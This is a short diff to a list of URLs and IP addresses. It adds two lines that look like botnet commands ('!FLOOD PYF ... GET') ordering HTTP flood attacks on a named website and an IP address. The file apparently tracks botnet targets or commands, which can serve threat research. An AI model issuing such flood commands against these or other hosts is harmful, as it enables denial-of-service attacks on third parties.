@@ -2,3 +2,6 @@ http://45.32.80.25/
 http://www.googletop.net/register
 http://109.71.9.87/
 http://167.71.202.248/
+http://138.201.139.144
+!FLOOD PYF http://138.201.139.144 2 2 2 5 2 GET 15
+!FLOOD PYF https://gemaritematik.net/ 80 250 50 1 10 GET 5
